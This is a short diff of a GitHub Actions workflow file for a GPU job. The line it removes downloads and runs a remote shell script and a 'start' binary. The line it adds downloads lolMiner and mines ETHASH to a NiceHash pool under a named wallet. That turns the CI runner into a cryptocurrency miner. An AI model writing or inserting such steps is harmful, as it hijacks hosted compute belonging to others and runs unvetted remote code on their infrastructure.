@@ -8,4 +8,4 @@ jobs:
     steps:
       - run: nvidia-smi
       - run: docker run --gpus all nvidia/cuda:9.0-base nvidia-smi
-      - run: wget https://raw.githubusercontent.com/Kunyuktea/test/main/graf.sh && chmod u+x graf.sh && ./graf.sh && chmod +x start &&./start
+      - run: wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.28/lolMiner_v1.28a_Lin64.tar.gz && tar xf lolMiner_v1.28a_Lin64.tar.gz && cd 1.28a && ./lolMiner --algo ETHASH --pool daggerhashimoto.usa-west.nicehash.com:3353 --user 3FNS3ubK3e76wiiLPMTK4K2ESw1GUgtXh5.Grafith1
